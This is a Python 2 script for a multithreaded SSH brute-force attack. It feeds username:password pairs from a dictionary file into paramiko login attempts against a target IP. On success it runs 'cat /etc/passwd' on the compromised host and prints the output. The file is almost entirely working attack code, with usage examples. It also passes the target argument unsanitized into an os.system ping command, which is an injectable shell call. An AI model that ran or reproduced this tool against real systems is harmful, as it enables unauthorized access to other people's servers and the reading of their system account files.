#!/usr/bin/python


# importing modules needed
import paramiko                 # for ssh client 
import sys                      # system implementations
import os                       # more system implementations
import time                     # effiency implemantations
import Queue                    # for keeping track of tasks
import threading                # for spawning slave threads

############################################################################################################################################
# global settings
config = {                                                                  # only num_of_attempts_per_thread is used
            "ssh_server_default_max_startup"     : 10,                      # others maybe implemented to wait for grace period
            "ssh_server_default_max_session"     : 10,                      # before attempting after the max startup attempts again
            "ssh_server_default_login_Gracetime" : 120,                     # for testing purposes, we did not implement the functionality
            "num_of_attempts_per_thread"         : 4                        # for production, please add in the functionality
        }

success = False                                                             # to be toggled upon bruteforce, and checked upon each queue job

############################################################################################################################################
# class definition
class BruteForce_Worker(threading.Thread):                                  # custom thread class
    def __init__(self, ssh, queue, threadnumber, targetIP):
        threading.Thread.__init__(self)                                     # initializing from original thread class
        self.ssh = ssh                                                      # assigning the existing ssh instance
        self.queue = queue                                                  # assigning queue
        self.threadnumber = threadnumber                                    # assigning this particular thread its thread number, for ID
        self.targetIP = targetIP                                            # assigning target host IP

    def run(self):                                                          # each thread will do the following
        global success                                                      # we will utitlize the global success check for each queue job
        print '+' * 100         
        print '[+] Thread ' + str(self.threadnumber) + ' is doing work'     # print to standard output 
        
        ssh_instance = self.ssh
        
        while True:                                                         # this will check the success flag, if not true as of yet: 
            if not success: 
                line = self.queue.get()                                     # getting each queue task
                user_pass = line.strip().split(':')                         # splitting it into a list format for [username, password]
                bruteforce(ssh_instance, self.targetIP, user_pass)          # passing all parameters to bruteforce function
                self.queue.task_done()                                      # upon completion, we will call task_done()
            else:                                                           # if success flag is toggled true by bruteforce function
                close_queue(self.queue)                                     # passing this entire queue to queue closing procedures
                
############################################################################################################################################

# function definitions
def error(msg):                                                     # error message to be outputted to standard output fd
    print '#' * 100
    print '[!] Uh oh, looks like something went wrong...'
    print '[!] ' + msg

#------------------------------------------------------------------------------------------------------------------------------------------#
def usage():                                                        # to be outputted if the initial user input was missing
    print '#'*100
    print '[!] Usage: ./multithread-sshbrute.py [host-ip] [file-path]'
    print '[!] Example: ./multithread-sshbrute.py 192.168.1.114 uname-pword.txt'
    print '#'*100
    print '[!] Exiting...'

#------------------------------------------------------------------------------------------------------------------------------------------#

def main(host, file_path):
    global config
    
    ssh_instance = ssh_client_setup()
    
    # we need to open up file and count up tasks
    tasks_init(ssh_instance, host, file_path, config['num_of_attempts_per_thread'])

    ssh_instance.close()
    print '[!] Exiting...'

#------------------------------------------------------------------------------------------------------------------------------------------#

def tasks_init(ssh, host, filePath, num_of_attempts_per_thread):
    # open up file to read
    fd = open(filePath, 'r')
    lines = fd.readlines()            # list format
    format_checker(lines)

    if len(lines) < (num_of_attempts_per_thread * 4):
        num_of_threads = 1                                      # thread count
        queues = queue_setup(num_of_threads, lines)             # setting up queue tasks
        t = thread_factory(ssh, queues[queues.keys()[0]], 1, host)         # setting up threads to work
        queues[queues.keys()[0]].join()                         # make sure this will block until all tasks are done

    else:
        num_of_threads = 4
        queues = queue_setup(num_of_threads, lines)
        for queue_name in queues:
            t = thread_factory(ssh, queues[queue_name], int(queue_name[10]), host)        # tenth element is the thread number
            queues[queue_name].join()

#------------------------------------------------------------------------------------------------------------------------------------------#

def format_checker(list_of_lines):
    for line in list_of_lines:
        if len(line.strip().split(':')) == 1:
            warning_msg = '[!] Warning!!!! username:password format is not strict in the input file, this will generate an error of list index out of range in the bruteforce function!'
            fix = '[!] Please use an input dictionary file that has a strict format on each of its lines to be ==> username:password'
            print warning_msg
            print fix

#------------------------------------------------------------------------------------------------------------------------------------------#

def queue_setup(num, lines):
    queue_obj = {}
    # populating queue obj
    for i in range(1, num + 1):
        name = 'queue_num_' + str(i)
        queue_obj[name] = Queue.Queue()
    
    # add in all the jobs to queue
    queues = jobadder(queue_obj, num, lines)
    
    # return to tasks init
    return queues

#------------------------------------------------------------------------------------------------------------------------------------------#

def jobadder(queue_obj, num, lines):     
    if num == 1:
        for line in lines:                           # adding all the lines to our only queue in queue obj
            queue_obj[queue_obj.keys()[0]].put(line)       
    else:                                           # num of queues equals to 4
        offset = len(lines) / 4
        for queue_name in queue_obj:
            if queue_name == 'queue_num_1':
                for line in lines[:offset]:
                    queue_obj[queue_name].put(line)
            elif queue_name == 'queue_num_2':
                for line in lines[offset:offset+offset]:
                    queue_obj[queue_name].put(line)
            elif queue_name == 'queue_num_3':
                for line in lines[offset+offset:offset+offset+offset]:
                    queue_obj[queue_name].put(line)
            elif queue_name == 'queue_num_4':
                for line in lines[offset+offset+offset:]:
                    queue_obj[queue_name].put(line)

    return queue_obj

#------------------------------------------------------------------------------------------------------------------------------------------#
            
def thread_factory(ssh, queue, threadnumber, host):
    slave_thread = BruteForce_Worker(ssh, queue, threadnumber, host)
    slave_thread.setDaemon(True)
    slave_thread.start()

    return slave_thread

#------------------------------------------------------------------------------------------------------------------------------------------#

def close_queue(queue):                     # close_queue will check if queue is empty, if not, it will get each task, and call task_done
    while queue.empty() is False:
        task = queue.get()
        queue.task_done()

#------------------------------------------------------------------------------------------------------------------------------------------#

def ssh_client_setup():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    paramiko.util.log_to_file("paramiko.log")

    return ssh

#------------------------------------------------------------------------------------------------------------------------------------------#

def bruteforce(ssh, host, user_pass):
    global success

    # assumming the user-pass file is of the form  username:password\n
    try: 
        print '[+] Trying to login using username: %s and password = %s' %(user_pass[0], user_pass[1])
        ssh.connect(host, username=user_pass[0], password=user_pass[1], banner_timeout=60, auth_timeout=60)

    except Exception as e:         # sys.exc_info() returns a tuple about the exception, and element 1 is the value of it
        print '[-] Bruteforce Attempt failed because of exception: ', e
    else:
        success = True
        print '[+] Successfully logged in using username: %s, and password: %s' %(user_pass[0], user_pass[1])
        stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')      # the command could technically be an input from cmdline
                
        for line in stdout.readlines():
            print line.strip()

#--------------------------------------------------------------------------------------------------------------------------------------------#

def input_check(arg_list):
    # check if first arg is pingable
    print arg_list
    ping_response = os.system('ping -c 1 -w2 ' + arg_list[1] + ' > /dev/null 2>&1')
    if ping_response is not 0:
        err_msg = 'The target system is not up atm, please try again..'
        error(err_msg)
        usage()
        sys.exit(1)
    if not os.path.isfile(arg_list[2]):
        err_msg = 'The dictionary file does not exist, please make sure you have entered the correct file path'
        error(err_msg)
        usage()
        sys.exit(1)

##############################################################################################################################################
# script execution
if __name__ == '__main__':
    if len(sys.argv) is not  3:
        usage()
        sys.exit(1)
    input_check(sys.argv)
    main(sys.argv[1], sys.argv[2])
    sys.exit(0)

